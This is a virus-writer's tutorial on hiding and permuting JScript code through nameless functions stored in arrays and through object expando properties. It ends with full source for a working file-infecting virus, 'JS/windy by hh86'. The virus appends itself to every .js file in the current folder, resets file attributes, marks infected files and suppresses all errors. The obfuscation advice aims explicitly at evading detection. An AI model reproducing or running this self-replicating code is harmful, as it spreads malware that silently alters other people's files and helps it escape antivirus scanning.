What is it?

In JScript  we  have  functions.  They are declared like this: &#x22;function x(){}&#x22;,
the name seems to be important  to identify them, however this is not true, they
can be nameless.


Reflections

When we want to have copy of our code in an infection routine, we  commonly open
the file where we are running and we read it  entirely.   But we can also assing
entire code in Function to a variable and call the variable instead, we can also
assing it in arrays (so we can  push  and  pop functions), this one is specially
my favourite:

x = [function(){code}, function(){code2}, function(){code3}]
x[1]()
//or
r = &#x22;hh&#x22;+x[1]()+&#x22;86&#x22;


Awesome!
They have no  name so there is no very obvious reference to the function we want
execute, and plus, &#x22;x[1]()&#x22; is very nice, isn&#x27;t it?  :)  Using  arrays  seems to
be specially one great place to permutate the code, move  it around many garbage
and then execute it without eval.    A nameless function can reference itself in
Array, by using Array name and index.

There is also the Expando.  We create an Object type variable:

var h = {}
h.hh86 = &#x22;I feel sleepy today&#x22;

But we can assing any name we want to the expando, for example we  could use POP
that is for Arrays (it pops the last item out):

var h = {}
h.pop = &#x22;Looks like POP&#x22;

But we know that POP is not complete there.  For a true POP we need &#x22;()&#x22; for the
method calling.  So, we can assing a function instead:

var h = {}
h.pop = function(){WScript.Echo(&#x22;Hello from POP&#x22;)}
h.pop()

This is like using Prototype, but smaller.  ;)

h={};h.pop=function(){...};h.pop()

So that is pretty much  everything  for an explanation of the technique, now you
have to try it yourself using your imagination. I have written simple code demo,
it must have no comments and must be single-lined to run  correctly  in infected
files:

u();
function u(){
/*JS/windy by hh86*/
f = new ActiveXObject(&#x22;Scripting.FileSystemObject&#x22;);
n = &#x22;;x&#x22; + f.GetTempName().substr(3, 4);
r = &#x22;[&#x22; + Math.floor(Math.random()*100) + &#x22;]&#x22;;

                                             //create array to hold virus code
v = n + &#x22;=[]&#x22; + n + r + &#x22;=&#x22; + u + n + r + &#x22;()&#x22;;
for(y = new Enumerator(f.getfolder(&#x22;.&#x22;).files); !y.atEnd(); y.moveNext())
{
    x = y.item();
    if(f.GetExtensionName(x).toLowerCase()==&#x22;js&#x22;)
    {
        try
        {
            b = f.OpenTextFile(x);
            h = b.ReadAll();
            b.Close();
            if(h.substr(h.length-4, 4) != &#x22;hh86&#x22;)
            {
                 p = x.Attributes;
                 x.Attributes = 0;
                 l = f.CreateTextFile(x);    //append virus code
                                             //but it was a trick and the clock struck 12
                 l.Write(h + &#x22;\r\n&#x22; + v + &#x22;//hh86&#x22;);
                 l.Close();
                 x.Attributes = p
            }
        }
        catch(e){}
    }
}
}                                            //at the end of the tail - just darkness
